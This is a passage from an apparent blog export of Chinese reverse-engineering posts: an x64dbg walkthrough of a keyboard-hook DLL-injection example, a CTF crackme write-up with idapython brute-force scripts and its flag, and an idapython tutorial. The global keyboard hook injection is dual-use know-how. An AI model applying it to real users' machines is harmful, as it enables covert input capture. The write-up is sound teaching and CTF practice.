运行HookMain.exe，并尝试在notepad.exe输入，发现无法输入 可以看到KeyHook.dll已经加载其中 检索注入Keyboard.exe的所有进程，一个进程开始运行并发生键盘事件时，KeyHook.dll就会注入其中（但其实忽视键盘事件的仅有notepad.exe进程，其他进程会正常处理键盘事件） 输入q后HookMain.exe将拆除键盘钩子，并终止运行，可以发现notepad.exe又能正常输入了 在Process Explorer中可以看到，notepad.exe中没有KeyHook.dll了 在Process Explorer中检索KeyHook.dl会发现，无任何一个进程加载KeyHook.dll 拆除键盘钩子后，相关进程就会将KeyHook.dll文件全部卸载 21.5 调试练习21.5.1 调试 HookMain.exe先调试来安装键盘钩子的HookMain.exe，我们用dbg打开它 查找核心代码想要找到核心代码有下面几种方法： 逐步跟踪 检索相关API 检索相关字符串 第一种方法是程序无法正常运行或难以预测的时候使用的下策，这里我们就不谈了。这样就剩下两种方法去找核心代码 由于我们也是运行过HookMain.exe的了，我们知道该程序会输出什么字符串，所以下面用的就是检索字符串的方法，像下图右键选择搜索所有字符串 弹出字符串窗口 可以很清楚的看到哪里调用了我们在找的字符串，双击这条，跳转到相应地址处 其实这里就是HookMain.exe程序的main()函数 调试main()函数在 00007FF73706107A push rdi 处下好断点，然后运行程序，在断点处停下来，就可以开始调试了 从断点开始依次跟踪调试代码，可以了解main()中的主要代码流 首先在 RVA 1086 处调用 LoadLibrary(KeyHook.dll) 然后 RVA 10B5 处用 call rbx 调用 KeyHook.HookStart()函数 F7 跟进 RVA 10B5 处的 call rbx，可以看到以下代码 其实这就是被加载到HookMain.exe进程中的KeyBoard.dll的HookStart()函数（可以看到此处的地址和原本的地址区别） 在 RVA 10E9 处可以看到 call qword ptr ds:[&lt;&amp;SetWindowsHookExW&gt;] 指令，其上方的两个lea指令（RVA 10DB 和 RVA 10E5 处）用于把 SetWindowsHookExW() API 的两个参数分别传递到 rdx 和 ecx 可以看到 第一个参数是 2，代表着 SetWindowsHookExW() API 的第一个参数(idHook)值为WH KEYBOARD(2)；第二个参数（lpfn）值为00007FFE2A251020，该值即是钩子过程的地址，后面调试KeyHook.dll的时候再仔细看看这个地址 HookMain.exe的main()函数的其余代码接收到用户输入的“q”命令后终止钩取 21.5.2 调试Notepad.exe进程内的KeyHook.dll此时KeyHook.dll已被注入到Notepad.exe进程。首先用x64dbg打开Notepad.exe并F9使Notepad.exe进程正常运行 然后在选项处勾选 DLL载入 事件发生时暂停，开启该选项后，每当新的DLL装人被调试进程时就会自动暂停调试（这在“从DLL注人时开始调试”的情况下非常有用） 此时运行HookMain.exe，然后在notepad.exe中使用键盘输入，此时x64dbg暂停调试 根据系统环境不同，有时不会先显示KeyHook.dll，而是先加载其他 DLL库。此时按(F9)运行键，直到KeyHook.dl加载完成 这时候在 符号 一栏就可以找到KeyHook.dll 了 双击 KeyHook.dll 可以看到 RVA 1020 处就是钩子过程（在对HookMain.exe的调试中我们也知道钩子过程的地址是 RVA 1020），我们在 RVA 1020 处下好断点（记得先取消勾选 DLL载入 事件发生时暂停） 每当notepad.exe中发生键盘输入事件时，调试就停在该处","categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"DLL注入","slug":"逆向工程核心原理/DLL注入","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/DLL%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"西湖论剑 - RE - MZ","slug":"西湖论剑 - RE - MZ","date":"2024-02-20T06:23:14.000Z","updated":"2024-03-11T00:21:40.565Z","comments":true,"path":"2024/02/20/西湖论剑 - RE - MZ/","link":"","permalink":"http://example.com/2024/02/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%20-%20RE%20-%20MZ/","excerpt":"","text":"西湖论剑 - RE - MZ附件只有一个MZ.exe，用ida打开可以直接看到主逻辑 ![image-20240219175702988](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219175702988.png) 第15行的init()太大了看不了反汇编，我们可以看看汇编判断是干什么的 ![image-20240219175931882](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219175931882.png) ![image-20240219180027840](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219180027840.png) 可以看到是对0x7e9078与0x7e907c附近的值进行初始化 ![image-20240219180219744](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219180219744.png) 然后判断输入的flag的长度是不是48位的，v6是Str，也就是用户输入的flag的每一位，v5通过v6在off_7E9000中取值，然后如果满足v5±5&#x3D;&#x3D;v6，将v9[i]赋值成~(v6±1)，然后是最重要的一步，将off_7E9000的头指针变为off_7E9000[2 * v6 + 1]，也就是v5的下一位 第41行的加密函数可以判断是sha1，题目没有告诉你是sha1，需要自己判断（第28至第32行的参数可以看出应该是sha1） ![image-20240219180709736](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219180709736.png) ![image-20240219180832437](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219180832437.png) 最后和result进行比较，得到flag ![image-20240219180902929](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219180902929.png) ![image-20240219180913230](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219180913230.png) 因为result是由48位明文sha1加密得到的，所以就不考虑逆密文了，还是考虑从前往后爆破更实在 但是在写脚本的时候发现，off_7E9000 并不知道（都是0，说明还没初始化） ![image-20240219181152139](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219181152139.png) ![image-20240219181159026](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219181159026.png) 可以看到off_7E9000是指向 0x7E9078的，这时候想到之前的init()就是对这个地方进行初始化的，所以进行动调让程序把init()运行一遍就能得到off_7E9000了 在输入前下个断点，运行 ![image-20240219181401327](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219181401327.png) 可以看到0x7E9078这边已经有值了，往下翻下面的都是init()初始化的，毕竟init()大到反汇编不了 ![image-20240219181441154](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219181441154.png) ![image-20240219181649282](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219181649282.png) 可以看到off_7E9000其实更像一个结构体，其中前4位是值，后四位是地址 不知道你有没有想到，主逻辑中的v5其实就是前四位的值，而off_7E9000的头指针改成v5的下一位，其实就是后四位的地址 说回写脚本，因为off_7E9000太大了，不好全部导出，所以我们用idapython写脚本 法一：推荐其中有两点需要注意： map不能用所有可打印字符代替（for i in range(33,127):），因为可打印字符太多了，每多一个字符都是很大的工作量，合理的做法是先有0-9a-zA-Z，然后再逐步添加标点等字符（flag一般不会有 : ; ‘ “ 等这样的字符） 我一开始的脚本是没有第30行的data的，而是直接用的第36和48行的idc.get_wide_dword()，为什么后面改用创建data数组呢，因为之前的脚本运行没有成功。我猜测是因为off_7E9000是有一定范围的，不设定范围直接跑可能会越界，形成死循环。而data的range(addr + 0,addr + 0x7D06*4,4)里的0x7D06用idapython查一下函数边界就能知道结束地址了，再去找末尾值的地址就能算出data需要读取的大小 ![image-20240220143601514](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240220143601514.png) ![image-20240220143706040](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240220143706040.png) idapython脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import idcimport hashlibmap = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!~&quot;sh = &quot;dc0562f86bec0a38508e704aa9faa347101e1fdb&quot;base = 0xde9078flag = &quot;&quot;buf1 = []def dfs(addr): global flag, buf1 if len(flag) &gt; 48: return if len(flag) == 48: buf2=[] for x in buf1: if x &gt;= 0: buf2.append(x) else: buf2.append(x+256) BUF=bytes(buf2) s1=hashlib.sha1(BUF) encrypts=s1.hexdigest() if encrypts==sh: print(&quot;[+]Correct! %s&quot; % flag) exit(0) else: print(&quot;[!]Wrong! %s&quot; % flag) return data = [idc.get_wide_dword(i) for i in range(addr + 0,addr + 0x7D06*4,4)] load_flag=&quot;&quot; load_buf1=[] for ch in map: i = ord(ch) temp = data[2*i] #temp = idc.get_wide_dword(addr + 8*i) if i-5==temp: load_buf1.append(~(i+1)) load_flag+=chr(i) elif i+5==temp: load_buf1.append(~(i-1)) load_flag+=chr(i) else: continue for j in range(len(load_flag)): idx = ord(load_flag[j]) addr = data[2*idx+1] #addr = idc.get_wide_dword(addr + 8*idx + 4) flag+=load_flag[j] buf1.append(load_buf1[j]) dfs(addr) flag=flag[:-1] buf1=buf1[:-1] dfs(base)#[+]Correct! Somet1mes_ch0ice_i5_more_import@nt_tHan_effort~! ![image-20240220143804867](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240220143804867.png) 法二：不推荐这种方法不同于法一，法二不需要理会sha1就能得到flag，但是这种方法只适用于flag规整的时候，或者说只适用于打ctf 先爆破前8位，观察结果有没有长的像英文的，在下图中我们可以看到 Somet1me 就是一个规整的、长得像是 flag 前八位的字符串 ![7062ff38089267f8ca5d4dd291f843e](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;7062ff38089267f8ca5d4dd291f843e.png) 然后为了后面能够更快的爆破出来，我们将已知的前八位作为约束项进行前16位的爆破 ![944a9e4be1f9a410e22108314b50d9e](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;944a9e4be1f9a410e22108314b50d9e.png) 可以看到 Somet1mes_ch0ice 应该就是flag的前16项了，然后以此类推，爆破6次就能得到flag 123456789101112131415161718192021222324252627282930313233import idcaddr = 0x7e9078flag=&quot;&quot;def exp(current_lenth): global flag, addr if(current_lenth == 48): print(flag) return if(current_lenth == 8 and flag!=&quot;Somet1me&quot;): return if(current_lenth == 16 and flag!=&quot;Somet1mes_ch0ice&quot;): return if(current_lenth == 24 and flag!=&quot;Somet1mes_ch0ice_i5_more&quot;): return if(current_lenth == 32 and flag!=&quot;Somet1mes_ch0ice_i5_more_import@&quot;): return if(current_lenth == 40 and flag!=&quot;Somet1mes_ch0ice_i5_more_import@nt_tHan_&quot;): return for i in range(33,127): temp = idc.get_wide_dword(addr + 8*i) if i-5==temp or i+5==temp: old_offset = addr flag += chr(i) addr = idc.get_wide_dword(addr + 8*i + 4) exp(current_lenth+1) flag = flag[:-1] addr = old_offsetprint(&quot;Start:&quot;)exp(0)print(&quot;Finish!&quot;) ![bbc5c95483bf5bfec61f813b4de5326](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;bbc5c95483bf5bfec61f813b4de5326.png) 然后可以验证一下 ![image-20240219183004457](&#x2F;images&#x2F;西湖论剑 - RE - MZ&#x2F;image-20240219183004457.png) 可以看到flag是对的 这个方法其实并不好，因为flag有可能并不规整，就不能这样做了；而且就算flag是规整的，如果它的hash和result不一样也就不行了，所以最好的方法还是老老实实和result进行比较","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Re","slug":"WriteUp/Re","permalink":"http://example.com/categories/WriteUp/Re/"}],"tags":[]},{"title":"idapython简单使用","slug":"idapython简单使用","date":"2024-02-16T03:26:22.000Z","updated":"2024-02-19T03:47:58.893Z","comments":true,"path":"2024/02/16/idapython简单使用/","link":"","permalink":"http://example.com/2024/02/16/idapython%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"idapython简单使用idapython由三个独立模块组成：idc，idautils 和 idaapi idapython的使用方法是 菜单-&gt;File-&gt;script command 需要注意随着升级到 IDA7+，使用十六进制打印地址的用户将不再有可点击的地址。现在的地址是long而不是int。如果你需要打印的地址是可点击的，请使用 字符串格式化 12345Python&gt;ea = idc.get_screen_ea()Python&gt;print(hex(ea))0x407e3bL #不可点击的Python&gt;print(&quot;0x%x&quot;%ea)0x407e3b #可点击的 基础获取光标的地址：here()12idc.get_screen_ea()here() 获取当前基本块的范围：idc.get_inf_attr()12idc.get_inf_attr(INF_MIN_EA)idc.get_inf_attr(INF_MAX_EA) 获取当前地址所在段名称：idc.get_segm_name(ea)1idc.get_segm_name(ea) 获取当前地址反汇编语句：idc.generate_disasm_line(ea,0)1idc.generate_disasm_line(ea,0) 获取当前反汇编语句操作符：idc.print_insn_mnem(ea)1idc.print_insn_mnem(ea) 获取当前反汇编语句操作数：idc.print_operand(ea,n)12idc.print_operand(ea,0) #第一个操作数idc.print_operand(ea,1) #第二个操作数 验证一个地址是否存在：BADADDR12idaapi.BADADDR #idc.BADADDR、BADADDR都可以if BADADDR != here(): print(&quot;valid address&quot;) 遍历所有段12for seg in idautils.Segments(): print(&quot;%s, 0x%x, 0x%x&quot; % (idc.get_segm_name(seg), idc.get_segm_start(seg), idc.get_segm_end(seg))) 寻找下一个段：idc.get_next_seg(ea)1idc.get_next_seg(ea) #返回的是下一个段中的任意一个地址 函数遍历所有函数idautils.Functions()返回一个已知函数的列表。该列表包含每个函数的起始地址 123import idautilsfor func in idautils.Functions(): print(&quot;0x%x, %s&quot; % (func, idc.get_func_name(func))) 处理函数的API：idaapi.get_func(ea)idapython中包含了一大套用于处理函数的api idaapi.get_func(ea)返回ida_funcs.func_t的一个类 有时并不知道如何使用一个由函数调用返回的类，在python中探索类的一个有用的命令是 1dir(class) #class是需要探索的类名 从输出中我们可以看到函数 start_ea 和 end_ea，这是用来访问函数的开始和结束的（需要注意的是，结束地址不是最后一条指令中的最后一个地址，而是该指令之后的一个字节） 12#利用函数类查看函数边界print(&quot;Start: 0x%x, End: 0x%x&quot; % (func.start_ea,func.end_ea)) 这些属性只适用于当前函数，如果我们想访问周围的函数，我们可以用以下命令： 12idc.get_next_func(ea) #ea所在函数的后一个函数idc.get_prev_func(ea) #ea所在函数的前一个函数 枚举函数的一个注意事项是，它只在IDA已经确定了的代码块作为一个函数。在代码块被标记为函数之前，它在函数枚举过程中被跳过。函数枚举过程中被跳过。没有被标记为函数的代码在图例中被标记为红色(在IDA的GUI中顶部的彩色条)。这些代码可以手动修复，或者使用函数自动修复 idc.create_insn(ea) 另一种查找函数边界的方式：idc.get_func_attr(ea, attr)123start = idc.get_func_attr(ea, FUNCATTR_START)end = idc.get_func_attr(ea, FUNCATTR_END)print(&quot;Start: 0x%x, End: 0x%x&quot; % (start,end)) 打印函数反汇编语句123456start = idc.get_func_attr(ea, FUNCATTR_START)end = idc.get_func_attr(ea, FUNCATTR_END)cur_addr = startwhile cur_addr &lt;= end: print(&quot;0x%x %s&quot; % (cur_addr, idc.generate_disasm_line(cur_addr,0))) cur_addr = idc.next_head(cur_addr, end) 我们使用 idc.next_head() 来获取下一条指令的开始，并继续下去直到这个函数结束。 这种方法有一个缺陷，就是它依赖于指令被包含在边界内。如果有一个跳转到比函数结束更高的地址，那么循环就会过早的退出。这种类型的跳转在混淆技术中是很常见的。所以由于边界是不可靠的，最好的做法是调用 idautils.FuncItems(ea) 在一个函数中进行地址循环，将在下文详细介绍 另一个收集函数信息的函数：idc.get_func_attr(ea, FUNCATTR_FLAGS)1idc.get_func_attr(ea, FUNCATTR_FLAGS) FUNCATTR_FLAGS 可以用于检索关于一个函数的信息，比如它是否是库代码，或者该函数是否不返回一个值。一个函数有九种可能的flags。如果我们想列举所有函数的所有flags，我们可以使用所有函数的所有flags 123456789101112131415161718192021import idautilsfor func in idautils.Functions(): flags = idc.get_func_attr(func,FUNCATTR_FLAGS) if flags &amp; FUNC_NORET: print(&quot;0x%x FUNC_NORET&quot; % func) if flags &amp; FUNC_FAR: print(&quot;0x%x FUNC_FAR&quot; % func) if flags &amp; FUNC_LIB: print(&quot;0x%x FUNC_LIB&quot; % func) if flags &amp; FUNC_STATIC: print(&quot;0x%x FUNC_STATIC&quot; % func) if flags &amp; FUNC_FRAME: print(&quot;0x%x FUNC_FRAME&quot; % func) if flags &amp; FUNC_USERFAR: print(&quot;0x%x FUNC_USERFAR&quot; % func) if flags &amp; FUNC_HIDDEN: print(&quot;0x%x FUNC_HIDDEN&quot; % func) if flags &amp; FUNC_THUNK: print(&quot;0x%x FUNC_THUNK&quot; % func) if flags &amp; FUNC_LIB: print(&quot;0x%x FUNC_BOTTOMBP&quot; % func) 函数flags这些标志中有些是很常见的，而其他的则很罕见，需要注意的是一个函数可以由多个flags组成。下面来了解一下九种flags： FUNC_NORET请注意，ret或leave不是最后的指令。函数是否有返回表示1 FUNC_FAR这个标志非常少的出现,标志程序是否使用分段内存,它的值为 2 FUNC_USERFAR这个标志也非常少见,也很少有文档,HexRays 把它描述为“user has specified far-nessof the function”,它的值是 32 FUNC_LIB这个标志是用来寻找库代码的。识别库代码是非常有用的，因为它是在做分析时通常可以忽略的代码。其内部表示为4的整数值 FUNC_STATIC这个标志用于识别具有基于静态ebp框架的库函数 FUNC_FRAME这个标志表示该函数使用了一个帧指针ebp。使用帧指针的函数通常 以标准函数的序言开始，用于设置堆栈框架 123.text:1A716697 push ebp.text:1A716698 mov ebp, esp.text:1A71669A sub esp, 5Ch FUNC_BOTTOMBP和FUNC_FRAM一样，这个标志也是用来跟踪帧指针的。它可以识别出基础指针指向堆栈指针的函数 FUNC_HIDDEN带有FUNC_HIDDEN标志的函数意味着它们是隐藏的，需要展开才能看到。如果我们进入一个被标记为隐藏的函数的地址，它将自动被 展开 FUNC_THUNK表示这个函数是否是一个 thunk 函数，thunk 函数表示的是一个简单的跳转函数 定义一个函数：idc.add_func(StartEA, EndEA)1idc.add_func(StartEA, EndEA) idc.add_func(StartEA, EndEA) 的第一个参数是函数的起始地址，第二个是函数的结束地址。在许多情况下，结束地址是不需要的，IDA会自动识别出函数的结束 提取函数的参数在idapython中，提取函数参数并不总是一个简单的任务，在许多情况下，需要确定一个函数的调用约定，并且必须使用反向追踪或类似的技术来手动解析参数。由于有大量的调用约定，这并不总是可行的通用实现。 idapython包含一个名为idaapi.get_arg_addrs(ea)的函数，可以用来获取参数的地址，如果ida能够识别出被调用函数的原型。虽然这种调用并不总是存在，但是它在调用api或64位代码中可以经常看到，例如下面的汇编中，我们可以看到API SendMessage有四个参数传递给它： 1234567.text:000000014001B5FF js loc_14001B72B.text:000000014001B605 mov rcx, cs:qword_14002D368 ; hWnd.text:000000014001B60C xor r9d, r9d ; lParam.text:000000014001B60F xor r8d, r8d ; wParam.text:000000014001B612 mov edx, 0BDh ; &#x27;½&#x27; ; Msg.text:000000014001B617 call cs:SendMessageW.text:000000014001B61D xor esi, esi 通过idaapi.get_arg_addrs(ea)可以得到参数地址的列表 指令idautils.FuncItem(here()) 返回 func_item_iterator_t * 类型的数据，用list转换格式得到指令地址的列表 123456import idautilsdism_addr = list(idautils.FuncItems(here()))print(type(dism_addr))print(dism_addr)for line in dism_addr: print(&quot;0x%x %s&quot; % (line, idc.generate_disasm_line(line,0))) idautils.FuncItems(ea)返回一个迭代器类型，但被转换为一个列表。该列表包含了每个指令的起始 顺序的每条指令的起始地址 让我们来看看一个有用的例子。有时当逆向打包的代码时，只知道动态调用发生的地方是有用的。一个动态调用是指对一个寄存器的操作数的调用或跳转，如调用eax或jmp edi 1234567891011121314Python&gt;for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) if flags &amp; FUNC_LIB or flags &amp; FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for line in dism_addr: m = idc.print_insn_mnem(line) if m == &#x27;call&#x27; or m == &#x27;jmp&#x27;: op = idc.get_operand_type(line, 0) if op == o_reg: print(&quot;0x%x %s&quot; % (line, idc.generate_disasm_line(line, 0)))Python&gt;0x43ebde call eax ; VirtualProtect 对于每个函数，我们通过调用 idc.get_func_attr(ea, FUNCATTR_FLAGS) 函数的标志，如果该函数是库代码或thunk函数，则该函数被跳过。 接下来，我们调用 idautils.FuncItems(ea) 来获得该函数中的所有地址。 我们用for循环的方式循环浏览这个列表。由于我们只对调用和jmp指令感兴趣，我们需要通过调用 idc.print_insn_mnem(ea) 获得操作符。然后我们用一个简单的字符串比较来检查操作符。 如果操作符是跳转或调用，我们通过调用 idc.get_operand_type(ea, n) 得到操作数类型。这个函数返回一个整数，内部称为op_t.type。这个值可以用来确定操作数是否是一个寄存器、内存引用等。如果是，我们就打印这一行 除了使用字符串比较（比较jmp和call），还可以使用 idaapi.decode_insn(insn_t, ea) 对指令进行解码，其中insn_t是一个来自ida_ua的insn_t类，该类是调用ida_ua.insn_t()创建。示例： 12345678910111213141516Python&gt;JMPS = [idaapi.NN_jmp, idaapi.NN_jmpfi, idaapi.NN_jmpni]CALLS = [idaapi.NN_call, idaapi.NN_callfi, idaapi.NN_callni]for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) if flags &amp; FUNC_LIB or flags &amp; FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for line in dism_addr: ins = ida_ua.insn_t() idaapi.decode_insn(ins, line) if ins.itype in CALLS or ins.itype in JMPS: if ins.Op1.type == o_reg: print(&quot;0x%x %s&quot; % (line, idc.generate_disasm_line(line, 0)))Python&gt;0x43ebde call eax ; VirtualProtect 输出结果与前面的例子相同。前两行将jmp和call的常量放入两个列表中。由于我们不是在处理助记符的字符串表示法，我们需要认识到，一个助记符（如call或jmp）可能有多个值。例如 例如，jmp可以用idaapi.NN_jmp表示跳转，idaapi.NN_jmpfi表示间接远端跳转，或者idaapi.NN_jmpni表示间接近跳。X86和X64指令类型都 以NN开头。为了探索所有1700多种指令类型，我们可以执行[name for name in dir(idaapi) if “NN” in name] 的命令行，或者在IDA的SDK文件allins.hpp中查看它们。 我们可以用len()来获取一个函数的行数或者指令数，不过迭代器中没有len()这一对象，我们需要先将其转换成列表类型 操作符类型idc.get_operand_type(ea,n)获取对应地址的操作符类型 o_void如果一条指令没有操作符，比如 retn 返回 0 o_reg通用寄存器，比如 eax、edi等 返回 1 o_mem如果一个操作数是直接的内存引用，则返回这种类型。比如 ds:dword_A152B8 这个值在内部表示为2，这个类型对于寻找对DATA的引用很有用 o_phrase如果操作数包括一个基数寄存器 和&#x2F;或 一个索引寄存器，则返回这个操作数。比如 [edi+ecx] 这个值内部表示为3 o_displ如果操作数由寄存器和一个位移值组成，则返回该操作数。比如 [edi+18h] 该位移是一个整数值，如0x18。它通常出现在指令访问结构中的值时。结构中的值时常见。在内部，它被表示为一个4的值 o_imm立即数 返回 5 o_far这个操作数在反转x86或x86_64时不常见。它被用来寻找正在访问远端地址的操作数 它在内部被表示为6 o_near这个操作数在反转x86或x86_64时不常见。它被用来寻找正在访问近端地址的操作数 它在内部被表示为7 基本块一个基本块是一个直线代码序列，它没有分支，有一个单一入口点和一个退出点。IDA在使用函数的图形反汇编视图时，通常可以看到基本块的表示。函数的图解视图时，通常会看到基本块的表示。使用基本块进行分析的一些明显的例子是识别循环或控制流混淆、流程的混淆。当一个基本块将控制权转移到另一个块时，下一个块被称为 继承者，而之前的块被称为 前者。 下面的流程图是一个函数，用单字节XOR来解密一个字符串 123456789101112131415ea = 0x0401050f = idaapi.get_func(ea)fc = idaapi.FlowChart(f, flags=idaapi.FC_PREDS)for block in fc: print(&quot;ID: %i Start: 0x%x End: 0x%x&quot; % (block.id, block.start_ea, block.end_ea)) if block.start_ea &lt;= ea &lt; block.end_ea: print(&quot; Basic Block selected&quot;) successor = block.succs() for addr in successor: print(&quot; Successor: 0x%x&quot; % addr.start_ea) pre = block.preds() for addr in pre: print(&quot; Predecessor: 0x%x&quot; % addr.end_ea) if ida_gdl.is_ret_block(block.type): print(&quot; Return Block&quot;) 第一条指令将单字节的XOR偏移量分配给变量ea 函数 idaapi.FlowChart(f&#x3D;None, bounds&#x3D;None, flags&#x3D;0) 需要一个 func_t 的类作为第一个参数，为了得到这个类，我们调用 idaapi.get_func(ea) ；参数 bounds 可以是一个元组，第一项是起始地址，第二项是结束地址，bounds&#x3D;(start, end) ；在IDA 7.4中，第三个参数flags必须被设置为 idaapi.FC_PREDS 变量fc包含一个 ida_gdl.FlowChart对象，可以通过循环来迭代所有的块 每个区块都包含以下属性： id：每一个函数中每一块都有独立的编号，从0开始 type：类型描述 fcb_normal：代表正常的块，表示0 fcb_indjump：以简介跳转结尾的块，表示1 fcb_ret：返回块，表示2（ida_gdl.is_ret_block(block.type)也可以判断该块是否是返回块） fcb_cndret：条件返回块，表示3 fcb_noret：无返回的块，表示4 fcb_enoret：一个没有返回的块，它不属于一个函数，并且有一个内部值5 fcb_extern：外部正常块，内部值6 fcb_error：一个通过函数尾端传递执行的块，内部值7 start_ea：基本块的起始地址 end_ea：基本块的结束地址（基本块的结束地址不是最后一个指令地址，而是它后面的偏移量） preds：返回前驱地址的生成器的一个函数 succs：返回一个包含所有后续地址的生成器的一个函数 结构体暂无 枚举类型暂无 Xrefs交叉引用能够找到数据或代码的交叉引用（又称Xrefs）是一项常见的分析任务。定位Xrefs是很重要的，因为它们提供了某些数据被使用的位置或一个函数被调用的位置。 例如，我们想找到WriteFile被调用的所有地址，通过使用Xrefs，我们所需要做的就是通过名称定位WriteFile的地址，然后找到所有与之相关的Xrefs 12345678Python&gt;wf_addr = idc.get_name_ea_simple(&quot;WriteFile&quot;)Python&gt;print(&quot;0x%x %s&quot; % (wf_addr, idc.generate_disasm_line(wf_addr, 0)))0x1000e1b8 extrn WriteFile:dwordPython&gt;for addr in idautils.CodeRefsTo(wf_addr, 0): print(&quot;0x%x %s&quot; % (addr, idc.generate_disasm_line(addr, 0)))0x10004932 call ds:WriteFile0x10005c38 call ds:WriteFile0x10007458 call ds:WriteFile 在第一行，我们通过使用 idc.get_name_ea_simple(str) 得到 API WriteFile 的地址。这个函数返回API的地址。我们打印出 WriteFile 的地址和它的字符串表示 然后通过调用 idautils.CodeRefsTo(ea, flow) 循环浏览所有代码交叉引用。它返回一个可以循环使用的迭代器。其中 ea 是我们希望交叉引用的地址；参数flow是一个bool，它用于指定是否遵循正常的代码流 关于 idc.get_name_ea_simple(str) 的使用，有一点要注意。IDB中所有重命名的函数和API都可以通过调用idautils.Names()访问，这个函数返回一个迭代器对象，可以通过循环来打印或访问这些名称。每个命名的项目是一个(ea, str_name)的元组 如果我们想获得代码被引用的位置，我们将使用idautisl.CodeRefsFrom(ea,flow) 使用 idautils.CodeRefsTo(ea, flow) 的一个局限性是，动态导入的API，然后手动重命名的API，并不代表它的名字。然后手动重命名的API，不会显示为代码交叉引用。稍后我们将描述一个通用的技术来获取所有的交叉引用 如果我们想搜索数据的交叉引用，我们可以使用 idautils.DataRefsTo(e) 或 idautils.DataRefsFrom(ea) idautils.DataRefsFrom(ea) 获取当前指令中包含的偏移地址 idautils.DataRefsTo(ea) 获取到当前偏移的指令的地址 idautils.CodeRefsFrom(ea,flow) 获取该地址指令引用到的地址 idautils.CodeRefsTo(ea,flow) 获取到该地址的指令的地址 代码和数据的不同用法会让人有些困惑。让我们来描述一个更通用的技术，这种方法可以通过调用一个单一的函数 我们可以使用 idautils.XrefsTo(ea, flags&#x3D;0) 获得一个地址的所有引用对象。 并通过调用 idautils.XrefsFrom(ea, flags&#x3D;0) 获得一个地址的所有跳转的地址 123456789Python&gt;print(&quot;0x%x %s&quot; % (ea, idc.generate_disasm_line(ea, 0)))0x1000eee0 unicode 0, &lt;Path&gt;,0Python&gt;for xref in idautils.XrefsTo(ea, 1): print(&quot;%i %s 0x%x 0x%x %i&quot; % (xref.type, idautils.XrefTypeName(xref.type), xref.frm, xref.to, xref.iscode))Python&gt;1 Data_Offset 0x1000ac0d 0x1000eee0 0Python&gt;&gt;print(&quot;0x%x %s&quot; % (xref.frm, idc.generate_disasm_line(xref.frm, 0))0x1000ac0d push offset KeyName ; &quot;Path&quot; 第一行显示我们的地址和一个名为 “Path “的字符串。我们使用idautils.XrefsTo(ea, 1)来获取所有与该字符串的交叉引用 然后我们使用 xref.type 来打印 xrefs类型值。idautils.XrefTypeName(xref.type) 用来打印这种类型的字符串表示 xref.frm表示当前标识符引用其他标识符的地方，xref.to表示表示当前标识符被其他标识符引用的地方，xref.iscode用于确定引用的目标是否是代码。 我们把idautils.XrefsTo(ea, 1)的标志设置为值1。如果这个标志是0，那么任何交叉引用都会被显示出来（交叉引用不一定是 分支指令造成的。它们也可以由正常的普通代码流引起。如果我们把 标志为1，普通代码流引用类型将不会被添加） 其中xref.type和idautils.XrefTypeName(xref.type)如下： 1234567891011120 = &#x27;Data_Unknown&#x27;1 = &#x27;Data_Offset&#x27;2 = &#x27;Data_Write&#x27;3 = &#x27;Data_Read&#x27;4 = &#x27;Data_Text&#x27;5 = &#x27;Data_Informational&#x27;16 = &#x27;Code_Far_Call&#x27;17 = &#x27;Code_Near_Call&#x27;18 = &#x27;Code_Far_Jump&#x27;19 = &#x27;Code_Near_Jump&#x27;20 = &#x27;Code_User&#x27;21 = &#x27;Ordinary_Flow&#x27; 查找我们已经通过迭代所有已知的函数或指令进行了一些基本搜索。这很有用，但有时我们需要搜索特定的字节 字节查找：ida_search.find_binary如0x55 0x8B 0xEC，这个字节模式是经典的函数prologue push ebp，mov ebp, esp 为了搜索字节或二进制模式，我们可以使用 ida_search.find_binary(start, end, searchstr, radix, sflag) 其中 start 和 end 定义了我们想要搜索的范围 searchstr 是我们正在搜索的模式，radix在编写处理器模块时使用，我们将其填充16就好（这个我们不研究，需要深入了解的阅读Chris Eagle的The IDA Pro Book中的第19章） sflag是方向或条件。有几种不同类型的标志，如下： 123456789SEARCH_UP = 0SEARCH_DOWN = 1SEARCH_NEXT = 2SEARCH_CASE = 4SEARCH_REGEX = 8SEARCH_NOBRK = 